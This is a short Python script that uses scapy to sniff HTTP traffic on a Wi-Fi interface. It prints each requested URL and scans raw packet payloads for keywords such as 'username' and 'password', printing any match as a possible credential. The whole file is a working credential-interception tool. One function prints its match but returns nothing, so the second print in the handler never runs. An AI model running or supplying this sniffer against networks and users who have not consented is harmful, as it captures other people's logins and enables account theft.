#!/usr/bin/env python 
import scapy.all as scapy
from scapy.layers import http

#Set the scroll to infinite in terminal 

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_urls(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load: 
                    print("\n\n[+] Possible username/password > " + load + "\n\n")
                    break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_urls(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)      
        if login_info:
             print("\n\n[+] Possible username/password > " + login_info + "\n\n")  

sniff("Wi-Fi")  